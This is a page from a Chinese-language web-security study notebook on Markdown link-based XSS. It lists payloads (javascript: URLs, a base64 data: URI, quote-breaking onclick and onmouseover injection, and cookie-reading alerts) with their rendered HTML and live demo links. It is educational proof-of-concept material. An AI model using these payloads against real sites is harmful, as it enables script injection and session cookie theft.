@@ -1,0 +1,395 @@
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+    <head>
+        
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=11; IE=10; IE=9; IE=8; IE=7; IE=EDGE" />
+        <title>連結攻擊 | 網站安全學習筆記</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 2.0.2">
+        
+        
+        <meta name="HandheldFriendly" content="true"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+        <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+        
+    
+    
+    <link rel="next" href="../../xss/markdown/xss-markdown-img-attack.html" />
+    
+    
+    <link rel="prev" href="../../xss/markdown/xss-markdown-README.html" />
+    
+
+        
+    </head>
+    <body>
+        
+        
+    <link rel="stylesheet" href="../../gitbook/style.css">
+    
+    
+
+        
+    <div class="book" data-level="1.1.1" data-basepath="../.." data-revision="Sun Nov 15 2015 18:59:46 GMT+0800 (CST)">
+    
+
+<div class="book-summary">
+    <div class="book-search">
+        <input type="text" placeholder="Type to search" class="form-control" />
+    </div>
+    <ul class="summary">
+        
+        
+        
+        
+
+        
+
+        
+    
+        <li class="chapter " data-level="0" data-path="index.html">
+            
+                
+                    <a href="../../index.html">
+                        <i class="fa fa-check"></i>
+                        
+                        Introduction
+                    </a>
+                
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1" data-path="xss/xss-README.html">
+            
+                
+                    <a href="../../xss/xss-README.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.</b>
+                        
+                        XSS
+                    </a>
+                
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.1" data-path="xss/markdown/xss-markdown-README.html">
+            
+                
+                    <a href="../../xss/markdown/xss-markdown-README.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.</b>
+                        
+                        Markdown
+                    </a>
+                
+            
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.1.1" data-path="xss/markdown/xss-markdown-link-attack.html">
+            
+                
+                    <a href="../../xss/markdown/xss-markdown-link-attack.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.1.</b>
+                        
+                        連結攻擊
+                    </a>
+                
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.1.2" data-path="xss/markdown/xss-markdown-img-attack.html">
+            
+                
+                    <a href="../../xss/markdown/xss-markdown-img-attack.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.2.</b>
+                        
+                        圖片攻擊
+                    </a>
+                
+            
+            
+        </li>
+    
+        <li class="chapter " data-level="1.1.3" data-path="xss/markdown/xss-markdown-script-attack.html">
+            
+                
+                    <a href="../../xss/markdown/xss-markdown-script-attack.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.1.3.</b>
+                        
+                        Script 攻擊
+                    </a>
+                
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="xss/xss-article.html">
+            
+                
+                    <a href="../../xss/xss-article.html">
+                        <i class="fa fa-check"></i>
+                        
+                            <b>1.2.</b>
+                        
+                        文章
+                    </a>
+                
+            
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+
+        
+        <li class="divider"></li>
+        <li>
+            <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+                Published with GitBook
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+    <div class="book-body">
+        <div class="body-inner">
+            <div class="book-header">
+    <!-- Actions Left -->
+    <a href="#" class="btn pull-left toggle-summary" aria-label="Table of Contents"><i class="fa fa-align-justify"></i></a>
+    <a href="#" class="btn pull-left toggle-search" aria-label="Search"><i class="fa fa-search"></i></a>
+    
+    <div id="font-settings-wrapper" class="dropdown pull-left">
+        <a href="#" class="btn toggle-dropdown" aria-label="Font Settings"><i class="fa fa-font"></i>
+        </a>
+        <div class="dropdown-menu font-settings">
+    <div class="dropdown-caret">
+        <span class="caret-outer"></span>
+        <span class="caret-inner"></span>
+    </div>
+
+    <div class="buttons">
+        <button type="button" id="reduce-font-size" class="button size-2">A</button>
+        <button type="button" id="enlarge-font-size" class="button size-2">A</button>
+    </div>
+
+    <div class="buttons font-family-list">
+        <button type="button" data-font="0" class="button">Serif</button>
+        <button type="button" data-font="1" class="button">Sans</button>
+    </div>
+
+    <div class="buttons color-theme-list">
+        <button type="button" id="color-theme-preview-0" class="button size-3" data-theme="0">White</button>
+        <button type="button" id="color-theme-preview-1" class="button size-3" data-theme="1">Sepia</button>
+        <button type="button" id="color-theme-preview-2" class="button size-3" data-theme="2">Night</button>
+    </div>
+</div>
+
+    </div>
+
+    <!-- Actions Right -->
+    
+    <div class="dropdown pull-right">
+        <a href="#" class="btn toggle-dropdown" aria-label="Share"><i class="fa fa-share-alt"></i>
+        </a>
+        <div class="dropdown-menu font-settings dropdown-left">
+            <div class="dropdown-caret">
+                <span class="caret-outer"></span>
+                <span class="caret-inner"></span>
+            </div>
+            <div class="buttons">
+                <button type="button" data-sharing="twitter" class="button">
+                    Share on Twitter
+                </button>
+                <button type="button" data-sharing="google-plus" class="button">
+                    Share on Google
+                </button>
+                <button type="button" data-sharing="facebook" class="button">
+                    Share on Facebook
+                </button>
+                <button type="button" data-sharing="weibo" class="button">
+                    Share on Weibo
+                </button>
+                <button type="button" data-sharing="instapaper" class="button">
+                    Share on Instapaper
+                </button>
+            </div>
+        </div>
+    </div>
+    
+
+    
+    <a href="#" target="_blank" class="btn pull-right google-plus-sharing-link sharing-link" data-sharing="google-plus" aria-label="Google"><i class="fa fa-google-plus"></i></a>
+    
+    
+    <a href="#" target="_blank" class="btn pull-right facebook-sharing-link sharing-link" data-sharing="facebook" aria-label="Facebook"><i class="fa fa-facebook"></i></a>
+    
+    
+    <a href="#" target="_blank" class="btn pull-right twitter-sharing-link sharing-link" data-sharing="twitter" aria-label="Twitter"><i class="fa fa-twitter"></i></a>
+    
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../" >網站安全學習筆記</a>
+    </h1>
+</div>
+
+            <div class="page-wrapper" tabindex="-1">
+                <div class="page-inner">
+                
+                
+                    <section class="normal" id="section-">
+                    
+                        <h1 id="markdown-xss-%E9%80%A3%E7%B5%90%E6%94%BB%E6%93%8A">Markdown XSS &#x9023;&#x7D50;&#x653B;&#x64CA;</h1>
+<h2 id="%E5%9F%B7%E8%A1%8C-javascript-alert">&#x57F7;&#x884C; JavaScript alert</h2>
+<p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x57F7;&#x884C; JavaScript alert</span>][<span class="hljs-link_reference">JsAlert</span>]
+[<span class="hljs-link_reference">JsAlert</span>]:<span class="hljs-link_url"> javascript:alert(123);</span>
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;javascript:alert(123);&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x57F7;&#x884C; JavaScript alert<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="javascript:alert(123);" target="_blank">&#x57F7;&#x884C; JavaScript alert</a></p>
+<h2 id="%E5%9F%B7%E8%A1%8C-javascript-prompt">&#x57F7;&#x884C; JavaScript prompt</h2>
+<p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x57F7;&#x884C; JavaScript Promtp</span>][<span class="hljs-link_reference">JsPromtp</span>]
+[<span class="hljs-link_reference">JsPromtp</span>]:<span class="hljs-link_url"> javascript:prompt(document.cookie,&apos;&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;)</span>
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;javascript:prompt(document.cookie,&apos;&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;)&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x57F7;&#x884C; JavaScript Promtp<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="javascript:prompt(document.cookie,&apos;&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;)" target="_blank">&#x57F7;&#x884C; JavaScript Promtp</a></p>
+<h2 id="%E5%9F%B7%E8%A1%8C-base64-javascript-alert">&#x57F7;&#x884C; base64 JavaScript alert</h2>
+<p><strong><em>&#x8F49;&#x63DB; javascript &#x7A0B;&#x5F0F;&#x70BA; base64 &#x5B57;&#x4E32;</em></strong></p>
+<blockquote>
+<p><a href="https://www.base64encode.org/" target="_blank">base64 &#x8F49;&#x63DB;&#x7DB2;&#x7AD9;</a></p>
+</blockquote>
+<pre><code>HTML&#xFF1A; &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
+
+base64&#xFF1A; PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+</code></pre><p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x57F7;&#x884C; base64 JavaScript alert</span>](<span class="hljs-link_url">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>)
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x57F7;&#x884C; base64 JavaScript alert<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K" target="_blank">&#x57F7;&#x884C; base64 JavaScript alert</a></p>
+<h2 id="%E6%BB%91%E9%BC%A0%E9%BB%9E%E6%93%8A%E4%BA%8B%E4%BB%B6-onclick">&#x6ED1;&#x9F20;&#x9EDE;&#x64CA;&#x4E8B;&#x4EF6; onclick</h2>
+<p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x6ED1;&#x9F20;&#x9EDE;&#x64CA;&#x4E8B;&#x4EF6; onclick</span>][<span class="hljs-link_reference">htmlOnClick</span>]
+[<span class="hljs-link_reference">htmlOnClick</span>]:<span class="hljs-link_url"> http://www.google.com.tw/#&quot;onclick=&apos;alert(123)&apos;</span>
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;http://www.google.com.tw/#&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-value">&apos;alert(123)&apos;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x6ED1;&#x9F20;&#x9EDE;&#x64CA;&#x4E8B;&#x4EF6; onclick<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="http://www.google.com.tw/#&quot;onclick=&apos;alert(123)&apos;" target="_blank">&#x6ED1;&#x9F20;&#x9EDE;&#x64CA;&#x4E8B;&#x4EF6; onclick</a></p>
+<blockquote>
+<p>&#x5728; gitbook &#x6709;&#x5C07;&#x7279;&#x6B8A;&#x5B57;&#x5143; &quot; &#x5B57;&#x4E32;&#x8F49;&#x63DB;&#x6210;&#x7121;&#x6CD5;&#x57F7;&#x884C;&#x7684; <code>&amp;quot;</code>&#xFF0C;&#x6240;&#x4EE5; gitbook &#x6C92;&#x6709;&#x9019;&#x65B9;&#x9762;&#x7684;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<h2 id="%E6%BB%91%E9%BC%A0%E6%BB%91%E9%81%8E%E4%BA%8B%E4%BB%B6-onmouseover">&#x6ED1;&#x9F20;&#x6ED1;&#x904E;&#x4E8B;&#x4EF6; onmouseover</h2>
+<p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x6ED1;&#x9F20;&#x6ED1;&#x904E;&#x4E8B;&#x4EF6; onmouseover</span>][<span class="hljs-link_reference">htmlOnMouseOver</span>]
+[<span class="hljs-link_reference">htmlOnMouseOver</span>]:<span class="hljs-link_url"> http://www.google.com.tw/#&quot;onmouseover=&apos;alert(123)&apos;</span>
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;http://www.google.com.tw/#&quot;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-value">&apos;alert(123)&apos;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x6ED1;&#x9F20;&#x6ED1;&#x904E;&#x4E8B;&#x4EF6; onmouseover<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="http://www.google.com.tw/#&quot;onmouseover=&apos;alert(123)&apos;" target="_blank">&#x6ED1;&#x9F20;&#x6ED1;&#x904E;&#x4E8B;&#x4EF6; onmouseover</a></p>
+<blockquote>
+<p>&#x5728; gitbook &#x6709;&#x5C07;&#x7279;&#x6B8A;&#x5B57;&#x5143; &quot; &#x5B57;&#x4E32;&#x8F49;&#x63DB;&#x6210;&#x7121;&#x6CD5;&#x57F7;&#x884C;&#x7684; <code>&amp;quot;</code>&#xFF0C;&#x6240;&#x4EE5; gitbook &#x6C92;&#x6709;&#x9019;&#x65B9;&#x9762;&#x7684;&#x6F0F;&#x6D1E;</p>
+</blockquote>
+<h3 id="%E6%93%B7%E5%8F%96%E4%BD%A0%E7%9A%84-cookie">&#x64F7;&#x53D6;&#x4F60;&#x7684; cookie</h3>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x64F7;&#x53D6;&#x4F60;&#x7684; cookie</span>][<span class="hljs-link_reference">JsCookie</span>]
+[<span class="hljs-link_reference">JsCookie</span>]:<span class="hljs-link_url"> javascript:document.cookie=&apos;yourcookie=&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;;alert(document.cookie);</span>
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;javascript:document.cookie=&apos;yourcookie=&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;;alert(document.cookie);&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x64F7;&#x53D6;&#x4F60;&#x7684; cookie<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="javascript:document.cookie=&apos;yourcookie=&#x9019;&#x662F;&#x4F60;&#x7684;cookie&apos;;alert(document.cookie);" target="_blank">&#x64F7;&#x53D6;&#x4F60;&#x7684; cookie</a></p>
+<h2 id="%E9%8C%AF%E8%AA%A4%E4%BA%8B%E4%BB%B6%E8%99%95%E7%90%86-onerror">&#x932F;&#x8AA4;&#x4E8B;&#x4EF6;&#x8655;&#x7406; onerror</h2>
+<p><strong><em>&#x7A0B;&#x5F0F;&#x78BC;</em></strong></p>
+<pre><code class="lang-markdown">[<span class="hljs-link_label">&#x932F;&#x8AA4;&#x4E8B;&#x4EF6;&#x8655;&#x7406; onerror</span>](<span class="hljs-link_url">javascript:window.onerror=alert;throw%20document.cookie</span>)
+</code></pre>
+<p><strong><em>&#x7522;&#x751F; Markdown HTML</em></strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">a</span> <span class="hljs-attribute">href</span>=<span class="hljs-value">&quot;javascript:window.onerror=alert;throw%20document.cookie&quot;</span> <span class="hljs-attribute">target</span>=<span class="hljs-value">&quot;_blank&quot;</span>&gt;</span>&#x932F;&#x8AA4;&#x4E8B;&#x4EF6;&#x8655;&#x7406; onerror<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span>
+</code></pre>
+<p><strong><em>Demo</em></strong></p>
+<p><a href="javascript:window.onerror=alert;throw%20document.cookie" target="_blank">&#x932F;&#x8AA4;&#x4E8B;&#x4EF6;&#x8655;&#x7406; onerror</a></p>
+<h2 id="%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99">&#x53C3;&#x8003;&#x8CC7;&#x6599;</h2>
+<ul>
+<li><a href="http://deadhorse.me/nodejs/2012/09/20/xss_in_cnode.html" target="_blank">XSS&#x7B49;web&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7684;&#x9632;&#x8303;</a></li>
+<li><a href="http://shubh.am/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/" target="_blank">Exploiting Markdown Syntax and Telescope Persistent XSS through Markdown (CVE-2014-5144)</a></li>
+</ul>
+
+                    
+                    </section>
+                
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="../../xss/markdown/xss-markdown-README.html" class="navigation navigation-prev " aria-label="Previous page: Markdown"><i class="fa fa-angle-left"></i></a>
+        
+        
+        <a href="../../xss/markdown/xss-markdown-img-attack.html" class="navigation navigation-next " aria-label="Next page: 圖片攻擊"><i class="fa fa-angle-right"></i></a>
+        
+    </div>
+</div>
+
+        
+<script src="../../gitbook/app.js"></script>
+
+    
+    <script src="../../gitbook/plugins/gitbook-plugin-livereload/plugin.js"></script>
+    
+
+<script>
+require(["gitbook"], function(gitbook) {
+    var config = {"fontSettings":{"theme":null,"family":"sans","size":2}};
+    gitbook.start(config);
+});
+</script>
+
+        
+    </body>
+    
+</html>
